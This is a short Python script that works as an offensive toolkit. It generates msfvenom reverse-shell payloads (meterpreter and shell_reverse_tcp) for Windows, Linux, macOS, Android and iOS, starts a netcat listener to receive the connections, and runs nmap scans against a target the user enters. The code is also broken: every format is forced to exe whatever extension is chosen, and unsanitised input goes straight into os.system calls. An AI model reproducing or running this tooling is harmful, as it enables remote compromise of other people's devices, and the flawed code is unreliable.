import os

def create_payload(os_choice, conn_choice, lhost, lport):
    payload_name = input("\nEnter custom name for your payload (or press Enter for default): ").strip() or "payload"
    payload_types = {
        "1": ("windows/meterpreter/reverse_tcp", "exe"),
        "2": ("linux/x86/shell_reverse_tcp", "elf"),
        "3": ("osx/x86/shell_reverse_tcp", "macho"),
        "4": ("android/meterpreter/reverse_tcp", "apk"),
        "5": ("ios/shell_reverse_tcp", "ipa"),
    }
    
    payload_str, out_ext = payload_types.get(os_choice, ("windows/meterpreter/reverse_tcp", "exe"))
    print(f"\nCreating {payload_str} payload with LHOST={lhost}, LPORT={lport} and name {payload_name}")
    os.system(f"msfvenom -p {payload_str} LHOST={lhost} LPORT={lport} -f exe > {payload_name}.{out_ext}")
    print(f"\nPayload generated: {payload_name}.{out_ext}")

def start_listener(lhost, lport):
    print("\033[1;33mStarting Listener...\033[0m")
    os.system(f"nc -lvnp {lport}")

def scan_network():
    target = input("Enter target IP or domain: ").strip()
    scan_types = {
        "1": "nmap -T4 -F",
        "2": "nmap -sS -A",
        "3": "nmap -p-",
        "4": "nmap -sS -sV -O",
    }
    
    scan_choice = input("Select Scan Type (1-4): ").strip()
    cmd = f"{scan_types.get(scan_choice, 'nmap -T4 -F')} {target}"
    print(f"\nExecuting: {cmd}")
    os.system(cmd)
